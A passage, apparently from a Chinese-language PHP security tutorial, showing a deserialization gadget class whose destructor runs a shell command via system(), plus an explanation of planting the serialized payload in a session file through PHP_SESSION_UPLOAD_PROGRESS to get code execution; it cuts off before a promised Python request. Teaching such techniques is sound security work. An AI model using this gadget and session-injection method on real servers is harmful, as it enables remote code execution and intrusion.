class Evil {
    public $cmd = 'id';
    public function __destruct() {
        system($this->cmd);
    }
}
$payload = serialize(new Evil());
// 写入session文件（例如通过PHP_SESSION_UPLOAD_PROGRESS或文件上传）
file_put_contents('/tmp/sess_xxx', $payload);
// 设置session_id为xxx，访问页面触发session_start()，反序列化后执行__destruct
?>


实际利用中，需要控制session文件内容。常见手法：利用PHP_SESSION_UPLOAD_PROGRESS特性，在文件上传时自动写入session数据。攻击者可以构造一个包含序列化payload的`PHP_SESSION_UPLOAD_PROGRESS`字段，PHP会将上传进度信息写入session文件，其中包含用户可控的字符串。通过精心构造，可以注入完整的序列化对象。以下是一个利用Python发送请求的示例：

